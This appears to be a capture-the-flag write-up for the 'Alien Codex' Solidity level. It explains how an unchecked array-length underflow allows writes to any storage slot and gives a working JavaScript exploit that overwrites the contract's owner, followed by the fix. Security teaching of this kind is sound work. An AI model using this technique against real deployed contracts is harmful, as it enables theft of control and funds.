# Level 19: Alien Codex

## Goal

Become the owner of the contract.

## The contract (Solidity < 0.8, no overflow checks)

```solidity
contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() { assert(contact); _; }

    function makeContact() public { contact = true; }
    function retract() public contacted { codex.length--; }
    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

## Vulnerability

Storage layout:
- slot 0: `owner` (from Ownable) packed with `contact`
- slot 1: `codex.length`
- `codex` elements start at `keccak256(1)`, i.e. `codex[i]` lives at `keccak256(1) + i`

`retract()` does `codex.length--`. If length is 0, this **underflows** to `2^256 - 1`, so the array now "spans" the entire 2^256 storage space. Combined with `revise(i, _content)`, an attacker can write to **any slot**, including slot 0 (owner), by choosing the right index.

## Exploit

```js
// 1. satisfy the contacted modifier
await contract.makeContact();

// 2. underflow the array length to 2^256 - 1
await contract.retract();

// 3. index that maps codex[i] to slot 0:
//    keccak256(1) + i = 2^256  =>  i = 2^256 - keccak256(1)
const p = web3.utils.soliditySha3({ type: "uint256", value: 1 });
const max = web3.utils.toBN("2").pow(web3.utils.toBN("256"));
const index = max.sub(web3.utils.toBN(p));

// 4. write your address (left-padded to 32 bytes) into slot 0 = owner
const addr = "0x000000000000000000000000" + player.slice(2);
await contract.revise(index.toString(), addr);
```

## Fix

- Use Solidity 0.8+, where the length underflow reverts (and `array.length--` assignment was removed entirely).
- Understand dynamic-array storage layout; never allow arbitrary index writes into a length-controlled array.

## Takeaway

An unchecked array-length underflow turns a bounded array into a write primitive over all of storage, including privileged variables like `owner`. Storage-layout mastery is key to advanced auditing.
